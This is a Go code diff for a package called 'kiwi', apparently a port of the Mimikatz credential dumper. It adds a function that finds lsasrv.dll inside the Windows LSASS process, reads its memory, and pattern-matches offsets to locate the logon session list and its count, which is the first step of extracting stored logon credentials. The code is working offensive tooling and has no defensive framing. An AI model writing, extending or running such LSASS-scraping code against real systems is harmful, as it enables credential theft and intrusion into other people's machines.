@@ -1,5 +1,16 @@
 package kiwi
 
+import (
+	"bytes"
+	"unsafe"
+
+	"github.com/pkg/errors"
+	"golang.org/x/sys/windows"
+
+	"project/internal/logger"
+	"project/internal/module/windows/api"
+)
+
 type patchPattern struct {
 	length int
 	data   []byte
@@ -127,3 +138,49 @@ var (
 )
 
 // x86
+
+func (kiwi *Kiwi) searchSessionList(pHandle windows.Handle, patch *patchGeneric) error {
+	modules, err := kiwi.getLSASSBasicModuleInfo(pHandle)
+	if err != nil {
+		return err
+	}
+	var mod *basicModuleInfo
+	for _, module := range modules {
+		if module.name == "lsasrv.dll" {
+			mod = module
+			break
+		}
+	}
+	if mod == nil {
+		return errors.New("failed to get module address about lsasrv.dll")
+	}
+	// read lsasrv.dll memory
+	memory := make([]byte, mod.size)
+	_, err = api.ReadProcessMemory(pHandle, mod.address, &memory[0], uintptr(mod.size))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
+	}
+	// search logon session list pattern
+	index := bytes.Index(memory, patch.search.data)
+	if index == -1 {
+		return errors.WithMessage(err, "failed to search logon session list pattern")
+	}
+	// read logon session list address
+	address := mod.address + uintptr(index+patch.offsets.off0)
+	var offset int32
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read offset about logon session list address")
+	}
+	logonSessionListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
+	kiwi.logf(logger.Debug, "logon session list address is 0x%X", logonSessionListAddr)
+	// read logon session list count
+	address = mod.address + uintptr(index+patch.offsets.off1)
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	if err != nil {
+		return errors.WithMessage(err, "failed to read offset about logon session list count")
+	}
+	logonSessionListCountAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
+	kiwi.logf(logger.Debug, "logon session list count address is 0x%X", logonSessionListCountAddr)
+	return nil
+}
